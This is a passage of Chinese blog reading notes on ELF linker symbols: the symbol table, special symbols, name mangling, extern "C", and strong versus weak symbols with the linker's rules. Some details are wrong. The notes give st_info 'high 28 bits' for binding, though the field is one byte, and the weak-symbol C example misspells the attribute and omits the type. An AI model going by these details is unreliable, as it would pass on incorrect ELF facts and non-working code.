title="3.5链接的接口——符号"></a>3.5链接的接口——符号</h1><p>在链接中，目标文件的相互拼接实际上是目标文件之间对地址的引用，就是对函数和变量地址的引用，我们将<strong>函数和变量统称为符号</strong>，函数名和变量名就是符号名。</p><p>每个目标文件都有一个相应的符号表(Symbol Table)，每个符号都有一个值，叫符号值，对于函数和变量来说，这就是它们的地址。</p><p>还有几种不常用到的符号：定义在本目标文件的全局符号、段名(它的值就是段的起始地址)、本目标文件引用的全局符号、局部符号、行号信息（目标文件指令和源代码中代码行对应的关系）。</p><h2 id="3-5-1-ELF符号结构"><a href="#3-5-1-ELF符号结构" class="headerlink" title="3.5.1 ELF符号结构"></a>3.5.1 ELF符号结构</h2><p>elf符号表往往是个段，段名“.symtab”。</p><p>符号表结构是一个Elf32_Sym结构的数组</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086280295.jpg"></p><p>符号绑定st_info，低4位表示符号类型。高28位表示符号绑定信息，有局部，全局符号还有弱引用。</p><p>符号所在段st_shndx，定义在本目标文件中，表示<strong>符号所在段 在段表 中的下标。</strong></p><p><strong>其他详细建议看书</strong></p><h2 id="3-5-2-特殊符号"><a href="#3-5-2-特殊符号" class="headerlink" title="3.5.2 特殊符号"></a>3.5.2 特殊符号</h2><p>使用ld作为链接器来链接生成可执行文件时，它会为我们定义很多特殊符号，这些符号不是我们定义的，但我们可以使用它，这些符号叫做特殊符号。详细看书</p><h2 id="3-5-3-符号修饰和函数签名"><a href="#3-5-3-符号修饰和函数签名" class="headerlink" title="3.5.3 符号修饰和函数签名"></a>3.5.3 符号修饰和函数签名</h2><p>相当于同一个函数名在不同函数位置中，或者不同返回类型，或者我们的一些函数和库重名，会有一些修饰区分它们，大概就是这样，详细看书。</p><h2 id="3-5-4-extern“C”"><a href="#3-5-4-extern“C”" class="headerlink" title="3.5.4 extern“C”"></a>3.5.4 extern“C”</h2><p>c++为了和C兼容，C++有一个声明和定义C符号的关键字“extern”</p><p>详细看书</p><h2 id="3-5-5-弱符号和强符号"><a href="#3-5-5-弱符号和强符号" class="headerlink" title="3.5.5 弱符号和强符号"></a>3.5.5 弱符号和强符号</h2><p>对于C&#x2F;C++语言来说，<strong>编译器默认函数和初始化了的全局变量为强符号，未初始化的全局变量为弱符号。</strong></p><p>也可以用GCC的“<strong>attribute</strong>((weak))”</p><p><strong>注意：强符号和弱符号都是针对定义来说的，不是针对符号的引用</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">_attribute_((weak)) weak2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，weak和 weak2 是弱符号， strong和 main 是强符号，而ext 既非强符号也非弱符号，因为它只是一个外部变量的引用。</p><details class="lake-collapse"><summary id="u805012ca"><span class="ne-text">针对强弱符号的概念，链接器会按如下规则处理和选择被多次定义的全局不好：</span></summary><ul class="ne-ul" style="margin: 0; padding-left: 23px"><li id="u61fcc03b" data-lake-index-type="0"><span class="ne-text">** 规则1：**不允许强符号被多次定义(即不同的目标文件不能有同名的强符号)；如果有多个强符号定义，则链接器包符号重复定义错误。</span></li><li id="ub79db9da" data-lake-index-type="0"><span class="ne-text">** 规则2：** 如果一个符号在某个目标文件中是强符号，在其他文件中都是弱符号，那么选择强符号。</span></li><li id="u023ddd23" data-lake-index-type="0"><span class="ne-text">** 规则3：** 如果一个符号在所有目标文件中都是弱符号，那么选择其中占用空间最大的一个。</span></li></ul><p id="u2d5f085f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">同样对于符号名的引用也分为强引用和弱引用，强引用表示如果找不到符号定义会报错，弱引用不报错，默认为0或某个特殊值。</span></p><p id="u380c2145" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"><br></span><span class="ne-text">链接：https://www.jianshu.com/p/31108b62f81d</span></p></details><p>同样对于符号名的引用也分为强引用和弱引用，强引用表示如果找不到符号定义会报错，弱引用不报错，默认为0或某个特殊值。</p><h1 id="3-6-调试信息"><a href="#3-6-调试信息" class="headerlink" title="3.6 调试信息"></a>3.6 调试信息</h1><p>如果我们GCC编译的时候加上“-g”参数，编译器产生的目标文件里面加上调试信息，可以用readelf工具查看，目标文件里面多了很多“debug”的段</p><p>我们可以用“strip”命令来去掉ELF的调试信息</p><h1 id="3-7-完"><a href="#3-7-完" class="headerlink" title="3.7 完"></a>3.7 完</h1>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> books-reading </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
